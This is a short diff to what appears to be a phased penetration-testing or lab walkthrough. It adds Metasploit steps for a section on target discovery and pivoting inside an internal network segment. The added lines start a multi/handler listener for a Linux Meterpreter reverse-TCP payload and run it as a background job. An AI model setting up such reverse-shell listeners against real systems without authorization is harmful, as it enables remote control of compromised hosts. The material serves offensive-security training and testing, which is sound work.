@@ -439,10 +439,25 @@ network.
 
 ## Phase 6: Target Discovery Inside Orange Space
 
-### Setup metasploit
+### Metasploit
 
 ```
 msfconsole -q
+```
+
+#### initialize the metasploit shell
+
+```
+use multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST eth0
+options
+```
+
+#### Execute metasploit shell in the background
+
+```bash
+run -j
 ```
 
 Assuming pivot success to internal hosts:
